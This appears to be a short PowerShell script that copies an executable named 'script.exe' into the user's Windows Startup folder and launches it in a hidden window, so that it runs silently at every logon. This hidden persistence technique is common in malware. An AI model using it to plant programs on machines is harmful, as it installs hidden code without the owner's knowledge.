
$ExeName = "script.exe"


$CurrentPath = $PSScriptRoot
$SourceExe = Join-Path -Path $CurrentPath -ChildPath $ExeName

$StartupFolder = [Environment]::GetFolderPath('Startup')
$DestinationExe = Join-Path -Path $StartupFolder -ChildPath $ExeName

if (Test-Path $SourceExe) {
    Copy-Item -Path $SourceExe -Destination $DestinationExe -Force
    

    Start-Process -FilePath $DestinationExe -WindowStyle Hidden
}
